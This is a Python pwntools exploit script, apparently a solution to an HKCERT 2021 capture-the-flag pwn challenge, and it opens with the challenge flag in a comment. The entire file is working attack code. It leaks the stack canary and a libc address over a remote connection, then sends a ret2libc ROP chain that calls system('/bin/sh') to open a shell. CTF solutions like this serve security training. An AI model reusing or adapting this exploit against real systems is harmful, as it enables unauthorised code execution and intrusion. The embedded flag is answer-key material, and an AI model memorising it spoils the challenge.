# hkcert21{pad1ng_nu11_bytE_t0_preven7_lEAking}
from pwn import *

elf = ELF("./chall")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

#target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
target = remote("chalp.hkcert21.pwnable.hk", 28329)

target.sendlineafter(".", "A"*0x68)

target.recvline()
target.recvline()

canary = u64("\x00" + target.recv(7))
log.info("Canary: " + hex(canary))

target.sendlineafter("End?[Y/N] ", "N")
target.sendline("A"*0x70 + "B"*7)

print target.recvuntil("B"*7 + "\n")

libc_base = u64((target.recv(6)).ljust(8, '\x00')) - libc.sym['__libc_start_main'] - 240
log.info("LIBC Base: " + hex(libc_base))
pop_rdi = p64(libc_base + 0x0000000000021112)
ret = p64(libc_base + 0x0000000000021113)

target.sendlineafter("End?[Y/N] ", "N")
target.sendline("A"*0x68 + p64(canary)*2 + pop_rdi + p64(libc_base + libc.search("/bin/sh\x00").next()) + p64(libc_base + libc.sym['system']))

target.sendlineafter("End?[Y/N] ", "Y")

target.interactive()